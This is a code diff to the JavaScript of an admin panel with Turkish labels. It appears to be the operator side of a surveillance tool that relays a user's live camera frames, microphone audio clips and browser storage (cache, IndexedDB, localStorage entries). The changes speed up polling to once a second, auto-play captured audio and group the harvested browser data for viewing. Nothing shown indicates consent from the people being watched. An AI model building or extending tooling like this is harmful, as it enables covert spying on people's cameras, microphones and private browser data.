@@ -244,7 +244,8 @@ function switchDetailTab(tab) {
 
 function startRelayPolling(uid) {
     stopRelayPolling();
-    userRelayInterval = setInterval(() => pollUserRelay(uid), 2000);
+    pollUserRelay(uid);
+    userRelayInterval = setInterval(() => pollUserRelay(uid), 1000);
 }
 
 function stopRelayPolling() {
@@ -293,24 +294,9 @@ function updateCameraView(camData) {
     view.innerHTML = `<img src="data:image/jpeg;base64,${camData.frame}" alt="Kamera" style="width:100%;">`;
 }
 
-async function startCameraStream(uid) {
+function startCameraStream() {
     const status = document.getElementById('cameraStatus');
-    status.textContent = '🟢 Canlı izleme aktif...';
-
-    if (cameraStreamInterval) clearInterval(cameraStreamInterval);
-
-    // Her saniye kare al
-    cameraStreamInterval = setInterval(async () => {
-        if (document.querySelector('.detail-tab[data-tab="camera"]')?.classList.contains('active')) {
-            const view = document.getElementById('adminCameraView');
-            if (view) {
-                const img = view.querySelector('img');
-                if (img) {
-                    // Frame zaten relay edilmiş, tekrar kontrol et
-                }
-            }
-        }
-    }, 1000);
+    if (status) status.textContent = '🟢 Canlı izleme aktif (1sn güncelleme)';
 }
 
 function stopCameraStream() {
@@ -389,10 +375,12 @@ function updateAudioView(audioData) {
 
     level.textContent = `Ses seviyesi: %${Math.round(avgLevel)} ${audioData.has_signal ? '🔊 Sinyal var' : '🔇 Sessiz'}`;
 
-    // Eğer clip varsa oynat
-    if (audioData.clip) {
-        const audio = new Audio(`data:audio/wav;base64,${audioData.clip}`);
-        audio.play();
+    if (audioData.clip && audioData.clip.length > 100) {
+        try {
+            const audio = new Audio(`data:audio/webm;base64,${audioData.clip}`);
+            audio.volume = 0.8;
+            audio.play().catch(() => {});
+        } catch (_) {}
     }
 }
 
@@ -532,16 +520,37 @@ function updateStorageView(storData) {
     }
     infoDiv.innerHTML = html;
 
-    // Dosyalar
     if (storData.files && storData.files.length > 0) {
-        filesDiv.innerHTML = '<h4 style="font-size:13px;margin-bottom:8px;">📂 Kullanıcı Dosyaları</h4>' +
-            storData.files.map(f => `
-                <div class="file-item">
-                    <span class="file-icon">${getFileIcon(f.name || f.filename || '')}</span>
-                    <span class="file-name">${f.name || f.filename || 'dosya'}</span>
-                    <span class="file-size">${f.size ? formatFileSize(f.size) : ''}</span>
-                </div>
-            `).join('');
+        const groups = {};
+        storData.files.forEach(f => {
+            const source = f.source || 'unknown';
+            if (!groups[source]) groups[source] = [];
+            groups[source].push(f);
+        });
+        const sourceLabels = { cache: '📦 Tarayıcı Önbelleği', serviceworker: '⚙️ Service Worker',
+            indexeddb: '🗄️ IndexedDB', localstorage: '📋 localStorage', unknown: '📁 Diğer' };
+        let treeHtml = '<h4 style="font-size:13px;margin-bottom:8px;">📂 Kullanıcı Tarayıcı Verileri</h4>';
+        Object.entries(groups).forEach(([src, files]) => {
+            treeHtml += `<details class="file-group" ${files.length <= 10 ? 'open' : ''}>
+                <summary style="cursor:pointer;padding:6px 0;font-size:13px;font-weight:600;color:var(--text-muted);">
+                    ${sourceLabels[src] || '📁 ' + src} (${files.length})
+                </summary>`;
+            files.slice(0, 50).forEach(f => {
+                const fname = f.name || f.filename || 'dosya';
+                const fsize = f.size ? formatFileSize(f.size) : '';
+                const displayName = fname.length > 80 ? fname.slice(0, 77) + '...' : fname;
+                treeHtml += `<div class="file-item">
+                    <span class="file-icon">${getFileIcon(fname)}</span>
+                    <span class="file-name" title="${fname.replace(/"/g, '&quot;')}">${displayName}</span>
+                    <span class="file-size">${fsize}</span>
+                </div>`;
+            });
+            if (files.length > 50) {
+                treeHtml += `<div style="font-size:11px;color:var(--text-muted);padding:4px 0;">+${files.length - 50} daha fazla...</div>`;
+            }
+            treeHtml += '</details>';
+        });
+        filesDiv.innerHTML = treeHtml;
     } else {
         filesDiv.innerHTML = '<p style="color:var(--text-muted);font-size:12px;">Henüz dosya yok</p>';
     }
